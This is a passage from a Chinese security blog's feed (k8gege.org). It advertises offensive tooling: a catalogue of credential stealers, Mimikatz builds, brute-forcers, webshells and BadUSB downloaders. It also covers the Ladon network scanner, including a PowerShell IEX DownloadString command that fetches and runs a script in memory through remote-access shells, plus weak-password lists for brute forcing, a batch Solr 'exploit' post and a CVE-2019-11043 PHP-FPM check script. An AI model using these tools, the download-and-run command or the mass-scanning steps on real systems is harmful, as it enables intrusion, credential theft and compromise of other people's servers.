MS17-010漏洞检测，cping、cscan批量专用<br><h3>数据库</h3>[+] 脱库工具 K8mysqlCmd.rar Mysql数据库免驱连接工具<br>[+] 脱库工具 K8_mysql脱裤20170114(千万).php<br>[+] 脱库工具 K8Packwebshell.aspx 整站打包工具<br>[+] 脱库工具 K8outSQL.aspx MSSQL导库工具<br><h3>加密解密</h3>[+] K8飞刀里大量加密解密算法、编码解码、SQL注入、XSS等<br>[+] 密码破解 SharpWeb.exe 浏览器帐密读取工具(Firefox/Chorme/IE)<br>[+] 密码破解 laZagne.exe 本地密码检索工具(支持XP/2003)<br>[+] 密码破解 sshtest.exe SSH密码登陆测试可结合Cscan进行批量破解<br>[+] 嗅探工具 k8ftpsniffer.py FTP<br>[+] 密码破解 K8_DNN_Password_Decrypt_20161110.rar dotnetnuke密码解密工具<br>[+] 密码破解 Invoke-Mimikatz.ps1  Mimikatz 20181209 <br>[+] 密码破解 mz.exe    Mimikatz-2.1.1-20181209 X86 一键版<br>[+] 密码破解 mz64.exe  Mimikatz-2.1.1-20181209 X64 一键版<br>[+] 密码破解 K8_FTP爆破PHP脚本20151010.rar 内网渗透用<br>[+] 密码破解 K8_Mysql爆破PHP脚本20151009.rar 内网渗透用<br>[+] 密码破解 K8_ipcscan 爆破IPC自动种马工具+教程.rar<br>[+] 密码破解 weblogic密码解密工具(exe & jar)<br>[+] 密码破解 K8fuckVNC.rar k8vncpwd.exe VNC密码解密工具<br>[+] 密码破解 K8getTeamViewPWD_20150705[K.8].rar<br>[+] 密码破解 K8正方密码解密工具_20150801[K.8].rar<br>[+] 密码破解 getBrowserPWD_1124[K.8].rar  Firefox\Ghrome 浏览器密码读取工具<br>[+] 密码破解 getvpnpwd.exe VPN、ADSL宽带帐密读取工具(仅限XP、2003)<br>[+] 密码破解 GetPassword_x64.rar GetPwd_K8.rar 一键获取明文<br>[+] 密码破解 K8_FuckOneShell 一句话密码爆破秒破10万<br>[+] 加密解密 K8Base32_Decode_20161110.rar<br>[+] 斛密工具 k8ungzip.exe GZIP 用于提取0day网马Powershell执行PAYLOAD<br>[+] 密码破解 K8FTP密码破解器V2.0_20190301[K8].rar<br>[+] 密码破解 K8Access数据库密码读取器_20190301[K8].rar<br>[+] 加密工具 K8_FileHideImg.exe 任意文件隐藏至图片工具<br><h3>安全辅助</h3>[+] 安全工具 K8木马病毒后门监视器V3.0.rar 捆绑后门木马释放路径、Shell上传路径查看<br>[+] 安全工具 K8进程拦截.rar (比方说访问网页浏览器调用外站EXE执行说明0day来了,而且可防止木马运行)<br>[+] 安全工具 K8驱动防止WebShell提权工具.rar (就是说无法通过WEBSHELL执行任意命令,就算有签名的EXE也不行)<br>[+] 辅助工具 K8注册表跳转.exe<br><h3>转发代理</h3>[+] 端口转发 PortTran.rar  .NET端口转发工具<br>[+] 端口转发 K8PortMap.exe D7端口映射工具<br><h3>WebShell</h3>[+] 转换工具 k8exe2bat.exe 任意文件转Bat工具(WebShell无法上传EXE解决方案)<br>[+] 上传工具 K8upload_1125[K8].rar 新型小马上传工具支持任意文件(内置asp\php\jsp小马)<br>[+] 连接工具 K8一句话ASP木马客户端加强程序版.exe<br>[+] WebShell k8cmd.ascx<br>[+] WebShell k8cmd.pl<br>[+] WebShell k8cmd.py<br>[+] WebShell k8飞刀CMD.jsp<br>[+] WebShell K8飞刀A专用UA一句话木马.asp<br>[+] WebShell K8飞刀PHP-专用UA一句话木马.php<br>[+] WebShell K8飞刀专用UA一句话木马.asxp<br>[+] WebShell shellcode.aspx <br><h3>硬件渗透</h3>[+]BadUSB K8飞刀  内含有大量Teensy渗透功能脚本自行研究<br>[+]BadUSB Teensy 兼容所有Windows和Linux系统下载者.ino<br><h3>其它工具</h3>[+]教程录制 K8屏幕录像 高压缩率版_20190301[K8].rar<br>[+]系统美化 K8文件夹个性设置工具.exe<br>[+]系统美化 K8个性桌面右键菜单.exe<br>[+]搜索工具 K8吉他谱搜索工具_20190301[K8].rar<br>[+]系统美化 图标提取器.exe<br>[+]系统美化 k8cmd.exe<br>[+]辅助工具 K8侠盗猎车4外挂.exe<br>[+]辅助工具 K8迅雷、快车、旋风地址互换工具.exe<br>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://github.com/k8gege&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;img alt=&quot;Author&quot; data-original=&quot;https://img.shields.io/badge/Author-k
      
    
    </summary>
    
    
      <category term="工具" scheme="http://k8gege.org/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
    
      <category term="K8tools" scheme="http://k8gege.org/tags/K8tools/"/>
    
  </entry>
  
  <entry>
    <title>Ladon Scanner For PowerShell</title>
    <link href="http://k8gege.org/p/673c210e.html"/>
    <id>http://k8gege.org/p/673c210e.html</id>
    <published>2019-12-27T13:10:00.000Z</published>
    <updated>2020-01-10T16:01:29.007Z</updated>
    
    <content type="html"><![CDATA[<p><img alt data-original="http://k8gege.org/k8img/Ladon/Dragon.jpg"></p><h3 id="程序简介"><a href="#程序简介" class="headerlink" title="程序简介"></a>程序简介</h3><p>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。5.5版本内置39个功能模块,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、Weblogic、ActiveMQ、Tomcat、Struts2等，密码爆破11种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH(Linux主机)、VNC、Windows密码(IPC、WMI、SMB)、Weblogic后台、Rar压缩包密码等，Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。<br></p><h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><table><thead><tr><th>ID</th><th>主题</th><th>URL</th></tr></thead><tbody><tr><td>1</td><td>Ladon文档主页</td><td><a href="https://github.com/k8gege/Ladon/wiki" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki</a><br></td></tr><tr><td>2</td><td>基础用法详解</td><td><a href="https://github.com/k8gege/Ladon/wiki/Ladon-Usage" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/Ladon-Usage</a><br></td></tr><tr><td>3</td><td>Cobalt Strike</td><td><a href="https://github.com/k8gege/Ladon/wiki/Ladon-&amp;-Cobalt-Strike" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/Ladon-&amp;-Cobalt-Strike</a><br></td></tr><tr><td>4</td><td>Exp生成器使用</td><td><a href="https://github.com/k8gege/Ladon/wiki/LadonExp-Usage" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/LadonExp-Usage</a></td></tr><tr><td>5</td><td>高度自定义插件</td><td><a href="https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle</a></td></tr><tr><td>6</td><td>外部模块参考</td><td><a href="https://github.com/k8gege/K8CScan/wiki" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/wiki</a></td></tr><tr><td>7</td><td>PowerLadon</td><td><a href="https://github.com/k8gege/Ladon/wiki/Ladon-&amp;-PowerShell" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/Ladon-&amp;-PowerShell</a></td></tr><tr><td>8</td><td>PythonLadon</td><td><a href="https://github.com/k8gege/PyLadon" target="_blank" rel="noopener">https://github.com/k8gege/PyLadon</a></td></tr><tr><td>9</td><td>LinuxLadon</td><td><a href="https://github.com/k8gege/LinuxLadon" target="_blank" rel="noopener">https://github.com/k8gege/LinuxLadon</a></td></tr><tr><td>10</td><td>漏洞演示视频</td><td><a href="https://github.com/k8gege/K8CScan/tree/master/Video" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/tree/master/Video</a></td></tr></tbody></table><h3 id="PowerLadon"><a href="#PowerLadon" class="headerlink" title="PowerLadon"></a>PowerLadon</h3><p>PowerLadon完美兼容win7-win10 PowerShell，对于不支持.net程序插件化的远控，可使用<br><br>PowerShell版,也可CMD命令行下远程加载内存实现无文件扫描，模块加载后用法和EXE一致。<br><br>Ladon.ps1脚本由EXE转换而成，具备EXE版所有功能,相关功能使用请查看Ladon说明文档。<br></p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>最新版本 <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a><br><br>历史版本 <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br></p><h4 id="0x001-PowerShell本地加载"><a href="#0x001-PowerShell本地加载" class="headerlink" title="0x001 PowerShell本地加载"></a>0x001 PowerShell本地加载<br></h4><p>适用于支持PowerShell交互远控或Shell，如Cobalt Strike</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell </span><br><span class="line">&gt; Import-Module .\Ladon.ps1</span><br><span class="line">&gt; Ladon OnlinePC</span><br></pre></td></tr></table></figure><p><img data-original="http://k8gege.org/k8img/Ladon/PowerLadon.gif"></p><h4 id="0x002-Cmd本地加载"><a href="#0x002-Cmd本地加载" class="headerlink" title="0x002 Cmd本地加载"></a>0x002 Cmd本地加载</h4><p>适用于还没跟上时代的远控或Shell只支持CMD交互</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell Import-Module .\Ladon.ps1;Ladon OnlinePC</span><br></pre></td></tr></table></figure><p><img data-original="http://k8gege.org/k8img/Ladon/ps/CmdPSLadon.gif"></p><h4 id="0x003-Cmd远程加载"><a href="#0x003-Cmd远程加载" class="headerlink" title="0x003 Cmd远程加载"></a>0x003 Cmd远程加载</h4><p>适用于还没跟上时代的远控或Shell只支持CMD交互</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:800/Ladon.ps1'); Ladon OnlinePC"</span></span><br></pre></td></tr></table></figure><p><img data-original="http://k8gege.org/k8img/Ladon/ps/CmdPSRemoteLadon.gif"></p><h4 id="0x004-远控交互式CMD"><a href="#0x004-远控交互式CMD" class="headerlink" title="0x004 远控交互式CMD"></a>0x004 远控交互式CMD</h4><p><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_rat.PNG"></p><h4 id="0x005-菜刀非交互CMD"><a href="#0x005-菜刀非交互CMD" class="headerlink" title="0x005 菜刀非交互CMD"></a>0x005 菜刀非交互CMD</h4><p><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_cd.PNG"></p><h4 id="0x006-Empire非交互CMD"><a href="#0x006-Empire非交互CMD" class="headerlink" title="0x006 Empire非交互CMD"></a>0x006 Empire非交互CMD</h4><p>Empire的shell有点问题，分号被截断，可以加个cmd /c<br><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_empire.PNG"></p><h4 id="0x007-MSF交互式CMD"><a href="#0x007-MSF交互式CMD" class="headerlink" title="0x007 MSF交互式CMD"></a>0x007 MSF交互式CMD</h4><p><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_msf.PNG"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img alt data-original=&quot;http://k8gege.org/k8img/Ladon/Dragon.jpg&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;程序简介&quot;&gt;&lt;a href=&quot;#程序简介&quot; class=&quot;headerlink&quot; title=&quot;程序简介&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
    
      <category term="工具" scheme="http://k8gege.org/categories/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
      <category term="PowerShell" scheme="http://k8gege.org/categories/PowerShell/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
    
      <category term="PowerShell" scheme="http://k8gege.org/tags/PowerShell/"/>
    
  </entry>
  
  <entry>
    <title>2011-2019年Top100弱口令密码字典</title>
    <link href="http://k8gege.org/p/16172.html"/>
    <id>http://k8gege.org/p/16172.html</id>
    <published>2019-12-21T13:30:24.000Z</published>
    <updated>2020-01-10T16:01:29.054Z</updated>
    
    <content type="html"><![CDATA[<h3 id="2019年最差密码123456"><a href="#2019年最差密码123456" class="headerlink" title="2019年最差密码123456"></a>2019年最差密码123456</h3><p>近日，在评估网上泄漏的500万个密码后，密码管理公司SplashData发布了2019年度最糟糕密码榜单，123456连续两年蝉联冠军，根据统计共有超过281万人使用；第二名的123456，统计共有超过248万人使用；第三名的123456789，统计共有超过105万人使用，1990、1991、1992也在榜上。</p><p>据了解，SplashData公布的最差密码100强，是从密码管理服务SplashID、TeaMSID、Gpass收集得来。除了数字之外，还有“qwerty”、“password”等。</p><p>观察前200名安全性最差的常用密码排行榜单，之所以很容易被窃取盗用，其共同特色就是很容易被猜到，烂密码可以归纳为5大类：使用简易数字组合（如12345）；键盘垂直或水平排列组合（如qwerty、1qaz2wsx）；体育相关单词；姓名相关和与食物相关的单词。</p><p>看看你的密码在里面吗？</p><h3 id="国外网民密码2011-2018"><a href="#国外网民密码2011-2018" class="headerlink" title="国外网民密码2011-2018"></a>国外网民密码2011-2018</h3><p><img alt data-original="http://k8gege.org/k8img/Other/top2011_2018.PNG"></p><h3 id="国外网民密码2019"><a href="#国外网民密码2019" class="headerlink" title="国外网民密码2019"></a>国外网民密码2019</h3><p>123456<br>12345679<br>qwerty<br>12345678<br>111111<br>1234567890<br>1234567<br>password<br>123123<br>987654321<br>qwertyuiop<br>mynoob<br>123321<br>666666<br>18atcskd2w<br>7777777<br>1q2w3e4r<br>654321<br>555555<br>3rjs1la7qe<br>google<br>1q2w3e4r5t<br>123qwe<br>zxcvbnm<br>1q2w3e</p><h3 id="服务器SSH-VPS密码Top100"><a href="#服务器SSH-VPS密码Top100" class="headerlink" title="服务器SSH/VPS密码Top100"></a>服务器SSH/VPS密码Top100</h3><p>PublishThisListPlease<br>root<br>!@<br>wubao<br>password<br>123456<br>admin<br>12345<br>1234<br>p@ssw0rd<br>123<br>1<br>jiamima<br>test<br>root123<br>!<br>!q@w<br>!qaz@wsx<br>idc!@<br>admin!@</p><p>alpine<br>qwerty<br>12345678<br>111111<br>123456789<br>1q2w3e4r<br>123123<br>default<br>1234567<br>qwe123<br>1qaz2wsx<br>1234567890<br>abcd1234<br>000000<br>user<br>toor<br>qwer1234<br>1q2w3e<br>asdf1234<br>redhat<br>1234qwer<br>cisco<br>12qwaszx<br>test123<br>1q2w3e4r5t<br>admin123<br>changeme<br>1qazxsw2<br>123qweasd<br>q1w2e3r4<br>letmein<br>server<br>root1234<br>master<br>abc123<br>rootroot<br>a<br>system<br>pass<br>1qaz2wsx3edc<br>p@$$w0rd<br>112233<br>welcome<br>!QAZ2wsx<br>linux<br>123321<br>manager<br>1qazXSW@<br>q1w2e3r4t5<br>oracle<br>asd123<br>admin123456<br>ubnt<br>123qwe<br>qazwsxedc<br>administrator<br>superuser<br>zaq12wsx<br>121212<br>654321<br>ubuntu<br>0000<br>zxcvbnm<br>root@123<br>1111<br>vmware<br>q1w2e3<br>qwerty123<br>cisco123<br>11111111<br>pa55w0rd<br>asdfgh<br>11111<br>123abc<br>asdf<br>centos<br>888888<br>54321<br>password123</p><h3 id="中国网民密码Top100"><a href="#中国网民密码Top100" class="headerlink" title="中国网民密码Top100"></a>中国网民密码Top100</h3><p>123456789<br>a123456<br>123456<br>a123456789<br>1234567890<br>woaini1314<br>qq123456<br>abc123456<br>123456a<br>123456789a<br>147258369<br>zxcvbnm<br>987654321<br>12345678910<br>abc123<br>qq123456789<br>123456789.<br>7708801314520<br>woaini<br>5201314520<br>q123456<br>123456abc<br>1233211234567<br>123123123<br>123456.<br>0123456789<br>asd123456<br>aa123456<br>135792468<br>q123456789<br>abcd123456<br>12345678900<br>woaini520<br>woaini123<br>zxcvbnm123<br>1111111111111111<br>w123456<br>aini1314<br>abc123456789<br>111111<br>woaini521<br>qwertyuiop<br>1314520520<br>1234567891<br>qwe123456<br>asd123<br>000000<br>1472583690<br>1357924680<br>789456123<br>123456789abc<br>z123456<br>1234567899<br>aaa123456<br>abcd1234<br>www123456<br>123456789q<br>123abc<br>qwe123<br>w123456789<br>7894561230<br>123456qq<br>zxc123456<br>123456789qq<br>1111111111<br>111111111<br>0000000000000000<br>1234567891234567<br>qazwsxedc<br>qwerty<br>123456..<br>zxc123<br>asdfghjkl<br>0000000000<br>1234554321<br>123456q<br>123456aa<br>9876543210<br>110120119<br>qaz123456<br>qq5201314<br>123698745<br>5201314<br>000000000<br>as123456<br>123123<br>5841314520<br>z123456789<br>52013145201314<br>a123123<br>caonima<br>a5201314<br>wang123456<br>abcd123<br>123456789..<br>woaini1314520<br>123456asd<br>aa123456789<br>741852963<br>a12345678</p><h3 id="越南网民密码Top100"><a href="#越南网民密码Top100" class="headerlink" title="越南网民密码Top100"></a>越南网民密码Top100</h3><p>123456<br>123456789<br>123123<br>111111<br>anhyeuem<br>1234567<br>123456789<br>123456<br>12345678<br>000000<br>asdasd<br>25251325<br>1234567890<br>121212<br>123321<br>zxcvbnm<br>qweqwe<br>456789<br>112233<br>aaaaaa<br>123123123<br>987654321<br>11111111<br>qwerty<br>147258369<br>maiyeuem<br>123qwe<br>654321<br>iloveyou<br>123654<br>999999<br>qqqqqq<br>1111111<br>147258<br>hota407<br>anhtuan<br>222222<br>159753<br>11223344<br>anhnhoem<br>anh123<br>159357<br>qwertyuiop<br>asd123<br>987654321<br>emyeuanh<br>mmmmmm<br>12345<br>666666<br>anhanh<br>123789<br>phuong<br>111222<br>qweasd<br>hanoiyeudau<br>nguyen<br>789456<br>1111111111<br>mylove<br>789456123<br>19001560<br>qwe123<br>asdfghjkl<br>pppppp<br>anhhung<br>1234560<br>abc123<br>maiyeu<br>123456a<br>zzzzzz<br>quangninh<br>987654<br>555555<br>tuananh<br>asasas<br>asdfgh<br>zxcvbn<br>321321<br>tinhyeu<br>147852369<br>456123<br>matkhau<br>147852<br>12345678910<br>thienthan<br>anhyeu<br>111111111<br>toilatoi<br>10cham0<br>147258369<br>456456<br>khongbiet<br>789789<br>a123456<br>333333<br>888888<br>123654789<br>truong<br>maimaiyeuem<br>hhhhhh</p><h3 id="完整字典下载"><a href="#完整字典下载" class="headerlink" title="完整字典下载"></a>完整字典下载</h3><p><a href="https://github.com/k8gege/PasswordDic" target="_blank" rel="noopener">https://github.com/k8gege/PasswordDic</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;2019年最差密码123456&quot;&gt;&lt;a href=&quot;#2019年最差密码123456&quot; class=&quot;headerlink&quot; title=&quot;2019年最差密码123456&quot;&gt;&lt;/a&gt;2019年最差密码123456&lt;/h3&gt;&lt;p&gt;近日，在评估网上泄漏的500万个密码
      
    
    </summary>
    
    
      <category term="密码" scheme="http://k8gege.org/categories/%E5%AF%86%E7%A0%81/"/>
    
    
      <category term="Password" scheme="http://k8gege.org/tags/Password/"/>
    
      <category term="Brute" scheme="http://k8gege.org/tags/Brute/"/>
    
  </entry>
  
  <entry>
    <title>Apache Solr &lt;=8.2.0 Velocity Template 0day Exploit</title>
    <link href="http://k8gege.org/p/61341.html"/>
    <id>http://k8gege.org/p/61341.html</id>
    <published>2019-12-18T16:00:00.000Z</published>
    <updated>2020-01-10T15:13:19.605Z</updated>
    
    <content type="html"><![CDATA[<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>下载Solr 8.2.0添加core,默认配置即可。7.x版本自带core</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>0x001 批量URL配置Cscan.ini<br><br>[Cscan]<br><br>exe=F:\Python279\python.exe<br><br>arg=exp.py $ip$ whoami<br><br>0x002 批量C段配置Cscan.ini<br><br>[Cscan]<br><br>exe=F:\Python279\python.exe<br><br>arg=exp.py http://$ip$:8983 whoami<br></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>单个: python exp.py url cmd<br> 或 Cscan url<br><br>批量C段: Cscan 192.168.1.8/24<br><br>批量URL: Cscan (同目录放url.txt)</p><img data-original="https://raw.githubusercontent.com/k8gege/SolrExp/master/Solr0day.gif"><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>Exp: <a href="https://github.com/k8gege/SolrExp" target="_blank" rel="noopener">https://github.com/k8gege/SolrExp</a><br>Cscan: <a href="https://github.com/k8gege/K8CScan" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h3&gt;&lt;p&gt;下载Solr 8.2.0添加core,默认配置即可。7.x版本自带core&lt;/p&gt;
&lt;h3 id=&quot;配置&quot;&gt;&lt;a href=&quot;#配置&quot; cl
      
    
    </summary>
    
    
      <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
    
      <category term="工具" scheme="http://k8gege.org/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Apache" scheme="http://k8gege.org/tags/Apache/"/>
    
      <category term="Solr" scheme="http://k8gege.org/tags/Solr/"/>
    
      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="0day" scheme="http://k8gege.org/tags/0day/"/>
    
  </entry>
  
  <entry>
    <title>Ladon POC CVE-2019-11043 PHP-FPM</title>
    <link href="http://k8gege.org/p/41162.html"/>
    <id>http://k8gege.org/p/41162.html</id>
    <published>2019-12-18T15:30:00.000Z</published>
    <updated>2020-01-10T15:18:29.469Z</updated>
    
    <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>PHP-FPM 远程代码执行漏洞(CVE-2019-11043)</p><p>在长亭科技举办的 Real World CTF 中,国外安全研究员 Andrew Danau 在解决一道 CTF 题目时发现,向目标服务器 URL 发送 %0a 符号时,服务返回异常,疑似存在漏洞。</p><p>在使用一些有错误的Nginx配置的情况下,通过恶意构造的数据包,即可让PHP-FPM执行任意代码。</p><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p>和Ladon.exe放在同一目录,即可对C段或url.txt进行批量检测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Ladon CVE-2019-11043_Poc.ini 批量URL检测(根目录下放url.txt)</span><br><span class="line">Ladon 192.168.1.37/24 CVE-2019-11043_Poc.ini 批量检测C段主机是否存在该漏洞</span><br><span class="line">Ladon http://192.168.1.37:8080/index.php CVE-2019-11043_Poc.ini 指定URL</span><br><span class="line">Ladon 5.5</span><br><span class="line">By K8gege</span><br><span class="line">Call AnyExe/Command</span><br><span class="line">http://192.168.1.37:8080/index.php</span><br><span class="line">load F:\Python279\python.exe</span><br><span class="line">ISVUL: CVE-2019-11043 http://192.168.1.37:8080/index.php</span><br></pre></td></tr></table></figure><p><img alt data-original="https://raw.githubusercontent.com/k8gege/CVE-2019-11043/master/CVE-2019-11043-POC.PNG"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># Ladon POC by k8gege</span></span><br><span class="line"><span class="comment"># VUL: CVE-2019-11043 (PHP-FPM + Ngnix)</span></span><br><span class="line"><span class="comment"># url need include .php Example：http://192.168.1.37:8080/index.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CVE-2019-11043_POC.ini</span></span><br><span class="line"><span class="comment"># [Ladon]</span></span><br><span class="line"><span class="comment"># exe=F:\Python279\python.exe</span></span><br><span class="line"><span class="comment"># arg=POC\CVE-2019-11043-POC.py $ip$</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Example</span></span><br><span class="line"><span class="comment"># Ladon 192.168.1.37/24 poc/CVE-2019-11043_Poc.ini</span></span><br><span class="line"><span class="comment"># Ladon http://192.168.1.37:8080/index.php poc/CVE-2019-11043_Poc.ini</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Result</span></span><br><span class="line"><span class="comment"># Ladon 5.5</span></span><br><span class="line"><span class="comment"># Call AnyExe/Command</span></span><br><span class="line"><span class="comment"># http://192.168.1.37:8080/index.php</span></span><br><span class="line"><span class="comment"># load F:\Python279\python.exe</span></span><br><span class="line"><span class="comment"># ISVUL: CVE-2019-11043 http://192.168.1.37:8080/index.php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkpoc</span><span class="params">(url)</span>:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">headers = &#123;<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0"</span>&#125;</span><br><span class="line">res1 = requests.get(url, headers=headers)</span><br><span class="line"><span class="keyword">if</span> res1.status_code == <span class="number">200</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"URL: "</span>+url</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1499</span>, <span class="number">1900</span>):</span><br><span class="line">res = requests.get(url + <span class="string">"/PHP%0Ais_poc_thistiest_lang.php?"</span> + <span class="string">"K"</span> * i, headers=headers)</span><br><span class="line"><span class="keyword">if</span> res.status_code == <span class="number">502</span>:</span><br><span class="line">print(<span class="string">"ISVUL: CVE-2019-11043 "</span>+url)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="string">"http"</span> <span class="keyword">in</span> url:</span><br><span class="line">checkpoc(url)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">checkpoc(<span class="string">"http://"</span>+url+<span class="string">"/index.php"</span>)</span><br><span class="line">checkpoc(<span class="string">"http://"</span>+url+<span class="string">":8080/index.php"</span>)</span><br><span class="line">checkpoc(<span class="string">"https://"</span>+url+<span class="string">"/index.php"</span>)</span><br></pre></td></tr></table></figure><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>Poc: <a href="https://github.com/k8gege/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/k8gege/CVE-2019-11043</a><br>Ladon: <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h3&gt;&lt;p&gt;PHP-FPM 远程代码执行漏洞(CVE-2019-11043)&lt;/p&gt;
&lt;p&gt;在长亭科技举办的 Real World CT
      
    
    </summary>
    
    
      <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
    
      <category term="工具" scheme="http://k8gege.org/categories/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="Code" scheme="http://k8gege.org/tags/Code/"/>
    
      <category term="Poc" scheme="http://k8gege.org/tags/Poc/"/>
    
      <category term="PHP" scheme="http://k8gege.org/tags/PHP/"/>
    
      <category term="Ngnix" scheme="http://k8gege.org/tags/Ngnix/"/>
    
      <category term="CVE-2019-11043" scheme="http://k8gege.org/tags/CVE-2019-11043/"/>
    
  </entry>
  
